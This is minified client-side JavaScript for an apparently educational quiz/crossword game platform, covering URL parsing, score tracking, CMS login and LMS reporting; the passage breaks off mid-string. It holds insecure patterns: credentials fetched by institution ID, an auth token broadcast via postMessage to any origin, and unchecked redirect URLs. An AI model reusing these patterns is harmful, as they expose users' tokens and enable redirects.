var CHALLENGE_GLOBAL={LOADING:"LOADING",ON_LOAD:"ON_LOAD",START:"START",SUBMIT_QUESTION:"SUBMIT_QUESTION",STOP:"STOP",RESIGN:"RESIGN",SOUND:"SOUND"},IsPlatform=!1,platformQuestionString="",platformSound=!1,platformQuestionDelay=500,oneOnOneHeight=null,oneOnOneWidth=null,IsCMSPlatform=!1;function RunPlatformCommand(a,p){try{if(window.parent.GlobalCom){IsPlatform=!0;var temp=window.parent.GlobalCom(a,p);return a===CHALLENGE_GLOBAL.ON_LOAD&&(platformQuestionString=temp.data,platformSound=temp.sound,platformQuestionDelay=temp.questionDelay,oneOnOneHeight=temp.height,oneOnOneWidth=temp.width),temp||!0}}catch(error){console.log(error)}return!1}var questionsJSON=[],Resumeables={timeSpentMilliSeconds:0,curQ:-1,allQ:[],CurrentScore:0},KP_SUPPORTED_OS={Unknown:-1,None:0,Android:1,iOS:2,Windows:3,Mac:4},APP_TYPES={Store:"",Classroom:"classroom",DirectLevel:"directLevel",Classroom_DirectLevel:"classroomdirectlevel"},UbService={version:"4.2.0",gameWidth:854,gameHeight:480,minScaleFactor:.375,timeSpentMilliSeconds:0,initParams:{},COMPLETION_STATUS:{NONE:0,NOT_ATTEMPTED:1,INCOMPLETE:2,COMPLETED:3},ApplicationURL:"",moduleid:0,userid:0,ispreview:1,ispublic:1,sessionId:"",cultureId:-1,launchArea:-1,ContentGuid:null,homeworkId:0,fromCMS:"0",cmsInternalLaunch:"0",container_id:"",institution_id:"",TrackingEnabled:!1,UseServerQuestionData:!1,Score:0,CompletionPercentage:0,CompletionStatus:0,TimeSpentSeconds:0,prevTrackData:[],localStorageKey:"com.knowledgeplatform.",shouldChangeViewPort:!1,isOfflineNotAlreadyWritten:!1,requestTimeout:6100,curReq:[],origParams:{},is_ExternalLMS:!1,Init:function(_gameName,_shouldChangeViewPort,callBackFunction){"function"!=typeof callBackFunction&&alert("Problem with init function of UBJ API. Callback function is not provided. Check the documentation."),this.gameViewPort=document.querySelector("meta[name=viewport]").content,this.AppendToAppID(_gameName),this.shouldChangeViewPort=_shouldChangeViewPort,window.onunload=this.onbeforeunloadFunc.bind(this);var _this=this;this.setParams((function(){_this.SetViewport(),_this.ensureOrientation(),_this.showCompatibilityPopup();var scaleValueForPopups=window.innerWidth/window.screen.width*(window.screen.width/window.screen.height);if(scaleValueForPopups>2.333&&(scaleValueForPopups=2.333),scaleValueForPopups<1.333&&(scaleValueForPopups=1.333),UbService.IsIos())for(var popupModals=document.querySelectorAll(".popUpContainer .modal"),i=0;i<popupModals.length;i++)popupModals[i].classList.add("iPhone"),popupModals[i].style.webkitTransform="scale("+scaleValueForPopups+", "+scaleValueForPopups+")",popupModals[i].style.MozTransform="scale("+scaleValueForPopups+", "+scaleValueForPopups+")",popupModals[i].style.msTransform="scale("+scaleValueForPopups+", "+scaleValueForPopups+")",popupModals[i].style.OTransform="scale("+scaleValueForPopups+", "+scaleValueForPopups+")",popupModals[i].style.transform="scale("+scaleValueForPopups+", "+scaleValueForPopups+")";console.log(_this,"this"),"1"===_this.fromCMS?(IsCMSPlatform=!0,_this.CmsLoginCredentials(callBackFunction,_this.cmsInternalLaunch)):_this.ContentGuid?_this.GetGameContent(callBackFunction):"function"==typeof callBackFunction?_this.GetGameScore(callBackFunction):_this.GetGameScore(null)})),window.addEventListener("resize",(function(e){UbService.ensureOrientation();var scaleToFitX=window.innerWidth/UbService.gameWidth,scaleToFitY=window.innerHeight/UbService.gameHeight;UbService.scaleFactor=Math.min(scaleToFitX,scaleToFitY),UbService.scaleFactor<UbService.minScaleFactor&&(UbService.scaleFactor=UbService.minScaleFactor)}))},parseURL:function(str){var query_string={},query="string"==typeof str?str:window.location.search.substring(1);const params=new URL(window.location.href).searchParams,sessionid=params.get("sessionid"),callback_data=params.get("callback_data");0===(query=query.toLocaleLowerCase()).length&&(query_string.type=APP_TYPES.Store,this.initParams=query_string);for(var vars=query.split("&"),i=0;i<vars.length;i++){var pair=vars[i].split("=");if(void 0===query_string[pair[0]])query_string[pair[0]]=decodeURIComponent(pair[1]);else if("string"==typeof query_string[pair[0]]){var arr=[query_string[pair[0]],decodeURIComponent(pair[1])];query_string[pair[0]]=arr}else query_string[pair[0]].push(decodeURIComponent(pair[1]))}query_string.type||(query_string.type=APP_TYPES.Store),sessionid&&(query_string.sessionid=sessionid),callback_data&&(query_string.callback_data=callback_data),this.initParams=query_string},setParams:function(callback){this.parseURL(),console.log(window.location.origin),this.ApplicationURL=window.location.origin+"/API/Game/";const hostname=window.location.hostname;console.log("hostname",hostname),"localhost"===hostname||hostname.includes("cmsdev")?this.CmsApplicationURL="https://cmsdev.knowledgeplatform.com":this.CmsApplicationURL="https://cmsapi.knowledgeplatform.com",console.log("this.CmsApplicationURL",this.CmsApplicationURL),this.origParams=this.initParams,this.is_ExternalLMS=this.initParams?.endpoint_url,console.log("this.initParams",this.initParams),console.log(this.initParams),this.initParams?.contentguid&&this.initParams?.islmsplayer&&(this.ApplicationURL="https://www.learnsmartpakistan.org/API/Game/");var x=this.getOsProps();(this.MobileOsType=x.OsEnum,this.MobileOsString=x.OsName,this.userid=this.initParams.userid,this.moduleid=this.initParams.moduleid,void 0!==this.initParams.ispublic&&(this.ispublic=this.initParams.ispublic),void 0!==this.initParams.ispreview&&(this.ispreview=this.initParams.ispreview),void 0!==this.initParams.cultureid&&(this.cultureId=this.initParams.cultureid),void 0!==this.initParams.sessionid&&(this.sessionId=this.initParams.sessionid),void 0!==this.initParams.contentguid&&(this.ContentGuid=this.initParams.contentguid),void 0!==this.initParams.launcharea&&(this.launchArea=this.initParams.launcharea),void 0!==this.initParams.homeworkid&&(this.homeworkId=this.initParams.homeworkid),void 0!==this.initParams.cfcms&&"1"===this.initParams.cfcms&&(this.fromCMS=this.initParams.cfcms),void 0!==this.initParams.cil&&"1"===this.initParams.cil&&(this.cmsInternalLaunch=this.initParams.cil),void 0===this.initParams.ins&&void 0===this.initParams.institution_id||(this.institution_id=this.initParams.ins||this.initParams.institution_id),void 0===this.initParams.ct&&void 0===this.initParams.content_id||(this.content_id=this.initParams.ct||this.initParams.content_id),void 0===this.initParams.con&&void 0===this.initParams.container_id||(this.container_id=this.initParams.con||this.initParams.container_id),void 0!==this.initParams.user_id&&(this.user_id=this.initParams.user_id),console.log("this.content_id",this.ispreview),1==this.ispreview||1==this.ispublic&&void 0!==this.initParams.ispublic||(this.TrackingEnabled=!0),void 0!==this.initParams.isoffline&&(this.initParams.isoffline=!0),this.initParams?.islmsplayer||this.initParams?.is_offline_lms)&&(document.getElementById("homeBt").style.display="none");this.setGameType(),this.setLocalStorageType(),"function"==typeof callback&&callback()},setGameType:function(){this.initParams.level?(this.initParams.level=parseInt(this.initParams.level),this.directLevel=!0,this.initParams.type===APP_TYPES.Classroom?this.initParams.type=APP_TYPES.Classroom_DirectLevel:this.initParams.type=APP_TYPES.DirectLevel):this.initParams.type===APP_TYPES.Classroom?this.initParams.type=APP_TYPES.Classroom:this.initParams.type=APP_TYPES.Store},setLocalStorageType:function(){this.AppendToAppID(this.initParams.type),this.initParams.userid&&this.AppendToAppID(this.initParams.userid),this.initParams.role&&this.AppendToAppID(this.initParams.role)},AppendToAppID:function(appendStr){""!==appendStr&&(appendStr+="."),this.localStorageKey+=appendStr},IsBrowserCompatible:function(){return!this.IsIos()||!this.IsFacebookInApp()},IsMob:function(){return!!(navigator.userAgent.match(/Android/i)||navigator.userAgent.match(/webOS/i)||navigator.userAgent.match(/iPhone/i)||navigator.userAgent.match(/iPad/i)||navigator.userAgent.match(/iPod/i)||navigator.userAgent.match(/BlackBerry/i)||navigator.userAgent.match(/Windows Phone/i))},IsIos:function(){return this.MobileOsType===KP_SUPPORTED_OS.iOS},IsAndroid:function(){return this.MobileOsType===KP_SUPPORTED_OS.Android},IsFacebookInApp:function(){var ua=navigator.userAgent||navigator.vendor||window.opera;return ua.indexOf("FBAN")>-1||ua.indexOf("FBAV")>-1},setVewPortToDeviceWidth:function(){this.shouldChangeViewPort&&!this.IsIos()&&(document.querySelector("meta[name=viewport]").content="width=device-width, user-scalable=0, initial-scale=1, maximum-scale=1, minimum-scale=1")},revertViewPort:function(){this.shouldChangeViewPort&&!this.isLoading&&this.SetViewport()},SetViewport:function(){var viewport=document.querySelector("meta[name=viewport]");window.cordova&&this.IsAndroid()?viewport.setAttribute("content","user-scalable=0, initial-scale=1, maximum-scale=1, minimum-scale=1"):this.IsIos()?viewport.setAttribute("content","user-scalable=0, maximum-scale=1"):viewport.setAttribute("content",this.gameViewPort)},showCompatibilityPopup:function(){this.IsBrowserCompatible()||(this.setVewPortToDeviceWidth(),KpQuery.addClass("#compatibilityContainer","d-flex"))},ensureOrientation:function(){window.innerWidth>=window.innerHeight?(this.revertViewPort(),KpQuery.removeClass("#orientationContainer","d-flex")):(this.setVewPortToDeviceWidth(),KpQuery.addClass("#orientationContainer","d-flex"))},GetGameContent:function(cb){if(this.initParams.isoffline){var localLocation=window.location.href;localLocation=localLocation.split("KpUltrabot")[0]+"KpUltrabot/Z2FtZXNEYXRh/",KpQuery.ajax(localLocation+=this.ContentGuid,"GET",{},(function(data){UbService.onReqSuccess(),UbService.onGetGameContentSuccess(data,cb)}),(function(){UbService.onReqFailure()}),!0)}else{this.showLoader();var per=document.getElementById("apiLoaderPercentage");per&&(per.setAttribute("style","display:block"),per.innerHTML="0% content loaded"),KpQuery.ajax(this.ApplicationURL+"GetJson","GET",{ContentGuid:this.ContentGuid},(function(data,type){"progress"!==type?(per&&per.setAttribute("style",null),UbService.onReqSuccess(),UbService.onGetGameContentSuccess(data,cb)):per&&(per.innerHTML=data+"% content loaded")}),(function(){UbService.onReqFailure()}))}},onGetGameContentSuccess:function(data,cb){data&&(UbService.UseServerQuestionData=!0,questionsJSON=JSON.parse(JSON.parse(data).data)),UbService.GetGameScore(cb)},GetGameScore:function(callBackFunction){this.TrackingEnabled?(Resumeables.timeSpentMilliSeconds=Resumeables.CurrentScore=0,Resumeables.curQ=-1,Resumeables.allQ=[],this.initParams.isoffline?this.onGetGameScoreSuccess(this.dbGet("gameData","{}"),callBackFunction):KpQuery.ajax(this.ApplicationURL+"GetGameScore","GET",{userid:this.userid,moduleid:this.moduleid,sessionId:this.sessionId,launchArea:this.launchArea,homeworkId:this.homeworkId},(function(data){UbService.onReqSuccess(),UbService.onGetGameScoreSuccess(data,callBackFunction)}),(function(){UbService.onReqFailure()}))):"function"==typeof callBackFunction&&callBackFunction({})},CmsLoginCredentials:function(callBackFunction,cmsInternalLaunch){KpQuery.ajax(this.CmsApplicationURL+"/api/users/apikey","POST",{institution_id:this.institution_id},(function(data){if("string"==typeof data){const _data=JSON.parse(data);UbService.onReqSuccess(),UbService.CmsLogin(_data.data[0],callBackFunction,cmsInternalLaunch)}}),(function(){UbService.onReqFailure()}))},CmsLogin:function(LoginCredentials,callBackFunction,cmsInternalLaunch){const content_id=this.content_id;KpQuery.ajax(this.CmsApplicationURL+"/api/login","POST",{username:LoginCredentials.uname,pwd:LoginCredentials.key},(function(data){if("string"==typeof data){const _data=JSON.parse(data),{user_id:user_id}=_data?.data;UbService.onReqSuccess(),1==UbService.initParams.islmsplayer?"undefined"!==content_id?UbService.GetCmsJsonByContentID(user_id,callBackFunction):UbService.GetCmsJsonByContainerID(user_id,callBackFunction):"1"===cmsInternalLaunch?content_id?UbService.GetCmsJsonByContentID(user_id,callBackFunction):UbService.GetCmsJsonByContainerID(user_id,callBackFunction):UbService.GetCmsJsonByContentID(user_id,callBackFunction)}}),(function(){UbService.onReqFailure()}))},GetCmsJsonByContentID:function(user_id,callBackFunction){KpQuery.ajax(this.CmsApplicationURL+"/api/generic/launch","POST",{user_id:user_id,content_id:parseInt(this.content_id),institution_id:parseInt(this.institution_id)},(function(data){if("string"==typeof data){const _data=JSON.parse(data);questionsJSON=UbService.GetCmsQuestionData(_data.data.content),UbService.GetGameScore(callBackFunction),UbService.onReqSuccess()}}),(function(){UbService.onReqFailure()}))},GetCmsJsonByContainerID:function(user_id,callBackFunction){KpQuery.ajax(this.CmsApplicationURL+"/api/editor/generic/open","POST",{user_id:user_id,container_id:this.container_id,institution_id:parseInt(this.institution_id)},(function(data){if("string"==typeof data){const _data=JSON.parse(data);questionsJSON=UbService.GetCmsQuestionData(_data.data[0]),UbService.GetGameScore(callBackFunction),UbService.onReqSuccess()}}),(function(){UbService.onReqFailure()}))},ExternalLMSCallback:function(_dto,auth_token){let urlParams=this.initParams;const configHeader={header:"authorization",value:`Bearer ${auth_token}`},nDto={..._dto,auth_token:auth_token};if(1!=urlParams.endpoint_url)KpQuery.ajax(urlParams.endpoint_url,"POST",{..._dto},(function(data){try{window.parent.postMessage(JSON.stringify({message:"module-completed",data:nDto}),"*")}catch(err){console.log(err)}if(urlParams.is_postbookmarking)return;const _data=JSON.parse(data);if(console.log("data",_data),urlParams.redirect_url)if(1==urlParams?.redirect_url)try{window.parent.postMessage(JSON.stringify({message:"close",data:{}}),"*")}catch(err){console.log(err)}else window.location.href=`${urlParams.redirect_url}`;else if(urlParams.is_popup){try{window.self.close()}catch{}try{window.close()}catch{}try{window.top.close()}catch{}}UbService.onReqSuccess()}),(function(){urlParams.is_postbookmarking||UbService.onReqFailure()}),urlParams.isOffline,auth_token?configHeader:void 0);else{try{window.parent.postMessage(JSON.stringify({message:"module-completed",data:nDto}),"*")}catch(err){console.log(err)}if(this.initParams.is_postbookmarking&&1==_dto.is_bookmarking)return;if(urlParams.redirect_url)if(1==urlParams?.redirect_url)try{window.parent.postMessage(JSON.stringify({message:"close",data:{}}),"*")}catch(err){console.log(err)}else window.location.href=`${urlParams.redirect_url}`;else if(urlParams.is_popup){try{window.self.close()}catch{}try{window.close()}catch{}try{window.top.close()}catch{}}}},submitToExternalCms:function(totalClues,currIndex,TimeSpentSeconds,totalHintsUsed){console.log({totalClues:totalClues,currIndex:currIndex,TimeSpentSeconds:TimeSpentSeconds,totalHintsUsed:totalHintsUsed}),console.log(this.prevTrackData);const isGameCompleted=currIndex+1===totalClues?1:0,total_correct_questions=currIndex+1;for(let i=0;i<totalClues;i++){if(currIndex>i){const questionItem={QuestionNo:this.prevTrackData[currIndex].QuestionNo,TimeSpentInSeconds:TimeSpentSeconds,isCorrect:1};this.prevTrackData[currIndex]=questionItem}if(0===currIndex&&currIndex===i){const questionItem={QuestionNo:i+1,TimeSpentInSeconds:currIndex===i?TimeSpentSeconds:0,isCorrect:currIndex===i?1:0};this.prevTrackData.push(questionItem)}if(0===currIndex&&i>0){const questionItem={QuestionNo:i+1,TimeSpentInSeconds:0,isCorrect:0};this.prevTrackData.push(questionItem)}}let totalTimeSpend=0;if(this.prevTrackData.length>0)for(i=0;i<this.prevTrackData.length;i++)totalTimeSpend+=this.prevTrackData[i].TimeSpentInSeconds;var dto={UserId:this.initParams?.user_id,ContentId:this.initParams.ct||0,ContainerId:this.initParams.con||0,TotalQuestions:totalClues,CorrectQuestions:total_correct_questions,TimeSpentInSeconds:totalTimeSpend,GameData:this.prevTrackData,TotalHintsUsed:totalHintsUsed,is_bookmarking:this?.initParams?.is_postbookmarking?isGameCompleted?0:1:void 0};if(this.initParams?.callback_data&&(dto={...dto,...JSON.parse(this.initParams?.callback_data)}),this?.initParams?.is_offline_lms&&isGameCompleted&&(dto.QuestionsData=dto.GameData,delete dto.GameData,window.parent.postMessage(JSON.stringify({message:"offline-game-submitted",data:dto}),"*")),this.initParams?.islmsplayer&&!this.initParams.is_postbookmarking){dto.QuestionsData=dto.GameData,delete dto.GameData;dto={enc_data:LZString.compressToBase64(JSON.stringify(dto)).split("=")[0]},(isGameCompleted||this?.initParams?.is_postbookmarking)&&this.ExternalLMSCallback(dto,this.initParams?.sessionid)}else(this?.initParams?.is_postbookmarking||isGameCompleted&&!this.initParams.is_offline_lms)&&this.ExternalLMSCallback(dto)},GetCmsQuestionData:function(data){const pJsonData=JSON.parse(data.json_data);console.log("pJsonData",data);const type=data.content_type.toLowerCase(),_data=[];if(pJsonData?.files&&"crossword"===type){for(let i=0;i<pJsonData?.files.length;i++)_data.push({word:pJsonData?.files[i].word,hintType:pJsonData?.files[i].type,hint:pJsonData?.files[i]?.clue||pJsonData?.files[i]?.path});return console.log(_data),_data}},GetCmsQuestionDataOffline:function(data){const pJsonData=data;console.log("pJsonData",data);const _data=[];if(pJsonData?.files){for(let i=0;i<pJsonData?.files.length;i++)_data.push({word:pJsonData?.files[i].word,hintType:pJsonData?.files[i].type,hint:pJsonData?.files[i]?.clue||pJsonData?.files[i]?.path});return _data}},onGetGameScoreSuccess:function(data,callBackFunction){try{"string"==typeof(data=JSON.parse(data))&&(data=JSON.parse(data)),void 0!==data.Score&&null!==data.Score&&(this.Score=data.Score),void 0!==data.CompletionPercentage&&null!==data.CompletionPercentage&&(this.CompletionPercentage=data.CompletionPercentage),void 0!==data.CompletionStatus&&null!==data.CompletionStatus&&(this.CompletionStatus=data.CompletionStatus),void 0!==data.TimeSpentSeconds&&null!==data.TimeSpentSeconds&&(this.TimeSpentSeconds=data.TimeSpentSeconds),KpQuery.css("#startNewGameButton",{display:"none"})}catch(e){data={}}if("string"==typeof data.GameData)try{Resumeables=JSON.parse(data.GameData)}catch(e){console.log(e)}void 0!==Resumeables.timeSpentMilliSeconds&&null!=Resumeables.timeSpentMilliSeconds||(Resumeables.timeSpentMilliSeconds=0),void 0!==Resumeables.curQ&&null!=Resumeables.curQ||(Resumeables.curQ=-1),void 0!==Resumeables.allQ&&null!=Resumeables.allQ||(Resumeables.allQ=[]),void 0!==Resumeables.CurrentScore&&null!=Resumeables.CurrentScore||(Resumeables.CurrentScore=0),0==data.errorCode&&(console.log("onGetGameScoreSuccess",Resumeables),data.CompletionStatus!=this.COMPLETION_STATUS.COMPLETED&&(data.CompletionStatus=this.COMPLETION_STATUS.INCOMPLETE,this.SubmitGameScore(data.Score,data.CompletionPercentage,data.CompletionStatus,data.TimeSpentSeconds,Resumeables))),"function"==typeof callBackFunction&&100!==data&&callBackFunction(data)},SubmitGameScore:function(Score,CompletionPercentage,CompletionStatus,TimeSpentSeconds,Resumeables){if(this.TrackingEnabled){var dto={UserId:this.userid,ModuleId:this.moduleid,CultureId:this.cultureId,GameData:JSON.stringify(Resumeables),MobileOsType:this.MobileOsType,MobileOsString:this.MobileOsString,sessionId:this.sessionId,LaunchArea:this.launchArea,homeworkId:this.homeworkId};this.CompletionStatus==this.COMPLETION_STATUS.COMPLETED&&CompletionStatus==this.COMPLETION_STATUS.INCOMPLETE?(dto.Score=this.Score,dto.CompletionPercentage=this.CompletionPercentage,dto.TimeSpentSeconds=this.TimeSpentSeconds,this.initParams.isoffline&&(dto.CompletionStatus=this.CompletionStatus)):(dto.Score=Score,dto.CompletionPercentage=CompletionPercentage,dto.TimeSpentSeconds=TimeSpentSeconds,this.Score=dto.Score,this.CompletionPercentage=dto.CompletionPercentage,this.CompletionStatus=CompletionStatus,this.TimeSpentSeconds=dto.TimeSpentSeconds,this.initParams.isOffline&&(dto.CompletionStatus=CompletionStatus)),this.initParams.isoffline||(dto.CompletionStatus=CompletionStatus),console.log("dto",dto),this.initParams.isoffline?this.dbSet("gameData",dto):KpQuery.ajax(this.ApplicationURL+"SubmitGameScore","POST",dto,(function(data){UbService.onReqSuccess()}),(function(){UbService.onReqFailure()}))}},onbeforeunloadFunc:function(e){this.TrackingEnabled&&window.opener.location.reload(!0)},InitTimer:function(){this.timeSpentMilliSeconds=(new Date).getTime()},GetTimeDifference:function(){var currentTimestamp=(new Date).getTime();return(new Date(currentTimestamp).getTime()-this.timeSpentMilliSeconds)/1e3},onReqSuccess:function(data){this.hideLoader()},onReqFailure:function(data){this.showLoader(!0),KpQuery.curReq[0].indexOf("GetJson")>-1&&KpQuery.css("#startNewGameButton",{display:"none"})},onRetry:function(){this.showLoader(),KpQuery.ajax(KpQuery.curReq[0],KpQuery.curReq[1],KpQuery.curReq[2],KpQuery.curReq[3],KpQuery.curReq[4])},onNewGameStart:function(){KpQuery.css("#cancelNewGame",{display:"inline-block"}),KpQuery.css("#continueNewGame",{display:"inline-block"}),KpQuery.css("#gameProgressMsg",{display:"block"}),KpQuery.css("#internetMsg",{display:"none"}),KpQuery.css("#retryRequestButton",{display:"none"}),KpQuery.css("#startNewGameButton",{display:"none"}),KpQuery.css("#internetIcon",{display:"none"})},onNewGameCancel:function(){KpQuery.css("#cancelNewGame",{display:"none"}),KpQuery.css("#continueNewGame",{display:"none"}),KpQuery.css("#gameProgressMsg",{display:"none"}),KpQuery.css("#internetMsg",{display:"block"}),KpQuery.css("#retryRequestButton",{display:"inline-block"}),KpQuery.css("#startNewGameButton",{display:"inline-block"}),KpQuery.css("#internetIcon",{display:"block"})},onContinueWithNewGame:function(){"function"==typeof this.curReq[3]&&this.curReq[3]({}),this.onNewGameCancel(),this.hideLoader(),KpQuery.css("#startNewGameButton",{display:"none"})},hideLoader:function(){this.isLoading=!1,this.revertViewPort(),KpQuery.removeClass("#apiLoaderContainer","d-flex"),KpQuery.removeClass("#apiLoader","hide"),KpQuery.removeClass("#apiRetryPopup","d-flex"),KpQuery.addClass("#apiLoaderContainer","hide"),KpQuery.addClass("#apiLoader","d-flex"),KpQuery.addClass("#apiRetryPopup","hide")},showLoader:function(isRetry){this.setVewPortToDeviceWidth(),this.isLoading=!0,document.getElementById("apiLoaderPercentage")&&document.getElementById("apiLoaderPercentage").setAttribute("style",null),KpQuery.addClass("#apiLoaderContainer","d-flex"),KpQuery.removeClass("#apiLoaderContainer","hide"),isRetry?(KpQuery.removeClass("#apiLoader","d-flex"),KpQuery.removeClass("#apiRetryPopup","hide"),KpQuery.addClass("#apiLoader","hide"),KpQuery.addClass("#apiRetryPopup","d-flex")):(KpQuery.addClass("#apiLoader","d-flex"),KpQuery.addClass("#apiRetryPopup","hide"),KpQuery.removeClass("#apiLoader","hide"),KpQuery.removeClass("#apiRetryPopup","d-flex"))},dbSet:function(key,value,alternativeKey){"object"==typeof value&&(value=JSON.stringify(value));var storageKey=void 0!==alternativeKey?alternativeKey:this.localStorageKey;localStorage[storageKey+key]=value},dbGet:function(key,defaultValue){return void 0===localStorage[this.localStorageKey+key]?defaultValue:(this.initParams.isoffline&&!this.isOfflineNotAlreadyWritten&&(this.dbSet("gameKey",this.localStorageKey,"com.knowledgeplatform.ub10mobile.offline."),this.isOfflineNotAlreadyWritten=!0),localStorage[this.localStorageKey+key])},dbDel:function(key){localStorage.removeItem(this.localStorageKey+key)},getOsProps:function(){var OsEnum=-1,OsName="Unknown",res=(new UAParser).getResult();return(OsName=res.os.name+" "+res.os.version).toLocaleLowerCase().indexOf("android")>-1?OsEnum=KP_SUPPORTED_OS.Android:OsName.toLocaleLowerCase().indexOf("ios")>-1?OsEnum=KP_SUPPORTED_OS.iOS:OsName.toLocaleLowerCase().indexOf("windows")>-1?OsEnum=KP_SUPPORTED_OS.Windows:OsName.toLocaleLowerCase().indexOf("mac")>-1&&(OsEnum=KP_SUPPORTED_OS.Mac),{OsName:OsName,OsEnum:OsEnum}}},KpQuery={getEl:function(s){if(void 0!==s&&null!=s)return window===s?s:document.querySelectorAll(s)},css:function(s,styles){if(void 0!==s&&null!=s){var e=s;"string"==typeof s&&(e=this.getEl(s));for(var i=0;i<e.length;i++)for(var p in styles)e[i].style[p]=styles[p]}},hasClass:function(el,className){return el.classList?el.classList.contains(className):new RegExp("\\b"+className+"\\b").test(el.className)},addClass:function(s,c){if(void 0!==s&&null!=s){var e=s;"string"==typeof s&&(e=this.getEl(s));for(var i=0;i<e.length;i++)e[i].classList?e[i].classList.add(c):this.hasClass(e[i],c)||(e[i].c+=" "+c)}},removeClass:function(s,c){if(void 0!==s&&null!=s){var e=s;"string"==typeof s&&(e=this.getEl(s));for(var i=0;i<e.length;i++)e[i].classList?e[i].classList.remove(c):e[i].className=e[i].className.replace(new RegExp("\\b"+c+"\\b","g"),"")}},hasEventListener:function(selector,type){for(var listeners=getEventListeners(document.querySelector(selector)),i=0;i<Object.keys(listeners).length;i++)for(var j=0;j<listeners[Object.keys(listeners)[i]].length;j++)if(listeners[Object.keys(listeners)[i]][j].type==type)return!0;return!1},triggerEvt:function(el,type){var e;"createEvent"in document?((e=document.createEvent("HTMLEvents")).initEvent(type,!1,!0),el.dispatchEvent(e)):((e=document.createEventObject()).eventType=type,el.fireEvent("on"+e.eventType,e))},addEventListener:function(s,e,cb){e=s;"string"==typeof s&&(e=this.getEl(s));for(var i=0;i<e.length;i++)el.attachEvent?e[i].attachEvent("on"+e,cb):e[i].addEventListener(e,cb)},addLiveEventListener:function(s,e,cb,c){this.addLiveEventListener(c||document,e,(function(e){for(var found,el=e.target||e.srcElement;el&&!(found=el.id==s);)el=el.parentElement;found&&cb.call(el,e)}))},width:function(e){return window===e?e.innerWidth:document===e?e.documentElement.clientWidth:e.clientWidth},height:function(e){return window===e?e.innerHeight:document===e?e.documentElement.clientHeight:e.clientHeight},hide:function(s){if(void 0!==s&&null!=s){var e=s;"string"==typeof s&&(e=this.getEl(s));for(var i=0;i<e.length;i++)"none"!==e[i].style.display&&e[i].setAttribute("data-olddisplay",e[i].style.display),e[i].style.display="none"}},show:function(s){if(void 0!==s&&null!=s){var e=s;"string"==typeof s&&(e=this.getEl(s));for(var i=0;i<e.length;i++)e[i].style&&(""!==e[i].style.display&&"none"!==e[i].style.display||(e[i].style.display=e[i].getAttribute("data-olddisplay")))}},text:function(el){return el.textContent},html:function(el){return el.innerHTML},ajax:function(call,requestType,data,success,error,isOffline,configHeader){if(this.curReq=[call,requestType,data,success,error],"GET"===requestType){var pairs=[];for(var prop in data)if(data.hasOwnProperty(prop)){var k=encodeURIComponent(prop),v=encodeURIComponent(data[prop]);pairs.push(k+"="+v)}call+="?"+pairs.join("&")}var x=null;try{(x=new XMLHttpRequest).open(requestType,call),configHeader&&x.setRequestHeader(configHeader.header,configHeader.value),x.setRequestHeader("X-Requested-With","XMLHttpRequest"),x.setRequestHeader("Content-type","application/json; charset=utf-8"),x.timeout=this.requestTimeout,x.onreadystatechange=function(){if(4==x.readyState){var resp={};try{resp=JSON.parse(JSON.parse(x.responseText))}catch(e){resp=JSON.parse(x.responseText)}!isOffline&&200!=x.status||0!==parseInt(resp.errorCode,10)&&0!==parseInt(resp.error_code,10)||"function"!=typeof success?"function"==typeof error&&error(x):(console.log("IDHR",x),success(x.responseText))}},x.addEventListener("progress",(function(e){success&&success(Math.floor(e.loaded/e.total*100),"progress")})),"GET"==requestType?x.send():x.send(JSON.stringify(data))}catch(e){"function"==typeof error&&error(e)}return x},getCORS:function(url,data,success){var pairs=[];for(var prop in data)if(data.hasOwnProperty(prop)){var k=encodeURIComponent(prop),v=encodeURIComponent(data[prop]);pairs.push(k+"="+v)}url+="?"+pairs.join("&");var xhr=new XMLHttpRequest;return"withCredentials"in xhr||(xhr=new XDomainRequest),xhr.open("GET",url),xhr.onload=success,xhr.send(),xhr}};!function(i,s){"use strict";var a="function",n="undefined",d="object",l="model",u="name",c="type",b="vendor",m="version",p="architecture",f="console",h="mobile",g="tablet",v="smarttv",x="wearable",y={extend:function(i,s){var e={};for(var o in i)s[o]&&s[o].length%2==0?e[o]=s[o].concat(i[o]):e[o]=i[o];return e},has:function(i,s){return"string"==typeof i&&-1!==s.toLowerCase().indexOf(i.toLowerCase())},lowerize:function(i){return i.toLowerCase()},major:function(i){return"string"==typeof i?i.replace(/[^\d\.]/g,"").split(".")[0]:s},trim:function(i){return i.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,"")}},S={rgx:function(i,e){for(var o,r,n,t,w,l,u=0;u<e.length&&!w;){var c=e[u],b=e[u+1];for(o=r=0;o<c.length&&!w;)if(w=c[o++].exec(i))for(n=0;n<b.length;n++)l=w[++r],typeof(t=b[n])===d&&t.length>0?2==t.length?typeof t[1]==a?this[t[0]]=t[1].call(this,l):this[t[0]]=t[1]:3==t.length?typeof t[1]!==a||t[1].exec&&t[1].test?this[t[0]]=l?l.replace(t[1],t[2]):s:this[t[0]]=l?t[1].call(this,l,t[2]):s:4==t.length&&(this[t[0]]=l?t[3].call(this,l.replace(t[1],t[2])):s):this[t]=l||s;u+=2}},str:function(i,e){for(var o in e)if(typeof e[o]===d&&e[o].length>0){for(var a=0;a<e[o].length;a++)if(y.has(e[o][a],i))return"?"===o?s:o}else if(y.has(e[o],i))return"?"===o?s:o;return i}},T={browser:{oldsafari:{version:{"1.0":"/8",1.2:"/1",1.3:"/3","2.0":"/412","2.0.2":"/416","2.0.3":"/417","2.0.4":"/419","?":"/"}}},device:{amazon:{model:{"Fire Phone":["SD","KF"]}},sprint:{model:{"Evo Shift 4G":"7373KT"},vendor:{HTC:"APA",Sprint:"Sprint"}}},os:{windows:{version:{ME:"4.90","NT 3.11":"NT3.51","NT 4.0":"NT4.0",2e3:"NT 5.0",XP:["NT 5.1","NT 5.2"],Vista:"NT 6.0",7:"NT 6.1",8:"NT 6.2",8.1:"NT 6.3",10:["NT 6.4","NT 10.0"],RT:"ARM"}}}},A={browser:[[/(opera\smini)\/([\w\.-]+)/i,/(opera\s[mobiletab]{3,6}).+version\/([\w\.-]+)/i,/(opera).+version\/([\w\.]+)/i,/(opera)[\/\s]+([\w\.]+)/i],[u,m],[/(opios)[\/\s]+([\w\.]+)/i],[[u,"Opera 